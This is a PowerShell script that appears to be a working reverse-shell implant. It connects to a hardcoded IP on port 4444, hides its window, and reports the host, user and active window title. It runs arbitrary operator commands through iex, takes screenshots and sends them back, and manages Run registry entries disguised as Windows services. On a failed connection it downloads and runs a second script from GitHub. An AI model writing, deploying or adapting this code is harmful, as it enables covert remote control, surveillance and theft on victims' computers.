# --- CONFIG ---
$ip   = '172.16.176.40'
$port = 4444
$pass = 'biskviti'
$user = "B15cu1t"
$reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# LINUX ALIASES (runs through your existing timeout system)
$LinuxAliases = @{
    'ls' = 'dir'
    'll' = 'dir /a'
    'la' = 'dir /a'
    'cd' = 'cd'
    'pwd' = 'pwd'
    'cat' = 'type'
    'touch' = 'New-Item -ItemType File'
    'rm' = 'Remove-Item -Force'
    'mkdir' = 'mkdir'
    'cp' = 'copy'
    'mv' = 'move'
    'ps' = 'Get-Process'
    'whoami' = 'whoami'
    'id' = 'whoami'
    'df' = 'Get-PSDrive'
    'top' = 'Get-Process | Sort-Object CPU -Descending | Select -First 10'
}

# Function to grab the Foreground Window Title
function Get-ActiveWin {
    $code = '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);'
    $type = Add-Type -MemberDefinition $code -Name "WinUtils" -Namespace "Util" -PassThru
    $handle = $type::GetForegroundWindow()
    $builder = New-Object System.Text.StringBuilder 256
    $type::GetWindowText($handle, $builder, 256) | Out-Null
    return $builder.ToString()
}

try {
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true

    $w.WriteLine("AUTH:")
    if ($r.ReadLine() -eq $pass) {
        
        # HIDE WINDOW
        try {
            $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
            $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
            $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
        } catch {}

        # --- INITIAL HANDSHAKE ---
        $who = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        $win = Get-ActiveWin
        $w.WriteLine("`n" + ("="*30))
        $w.WriteLine("  HOST: $env:COMPUTERNAME")
        $w.WriteLine("  USER: $who")
        $w.WriteLine("  TASK: $win")
        $w.WriteLine(("="*30) + "`n")

        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $raw = $r.ReadLine(); if ($null -eq $raw) { break }
            $cmd = $raw.Trim()

            if ($cmd -eq "exit") { break }
            
            # NEW COMMAND: Just get the active window name
            elseif ($cmd -eq "window") {
                $w.WriteLine("[ACTIVE]: " + (Get-ActiveWin))
            }

            elseif ($cmd -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            }
            
            elseif ($cmd -eq "kill") {
                "WinDiag","WinUpdate","WinLog","WinService" | ForEach-Object {
                    $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
                    if ($item.$_ -like "*$user*") { Remove-ItemProperty -Path $reg -Name $_ }
                }
                $w.WriteLine("[!] Cleanup Complete."); $c.Close(); Stop-Process -Id $PID -Force 
            }
            
            # TIMEOUT EXECUTION WITH LINUX ALIASES
            else { 
                # Translate Linux commands
                $translatedCmd = $LinuxAliases[$cmd] ?? $cmd
                $job = Start-Job -ScriptBlock { param($c) iex $using:translatedCmd 2>&1 | Out-String } -ArgumentList $translatedCmd
                $timeout = 10
                if (Wait-Job $job -Timeout $timeout) {
                    Receive-Job $job | % { $w.WriteLine($_) }
                } else {
                    Stop-Job $job; Remove-Job $job
                    $w.WriteLine("[!] Command timed out after 10s")
                }
            }
        }
    } else {
        "WinDiag","WinUpdate","WinLog","WinService" | % { Remove-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue }
        exit
    }
    $c.Close()
} catch {
    Start-Sleep -s 120
    iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v2.ps1")
}
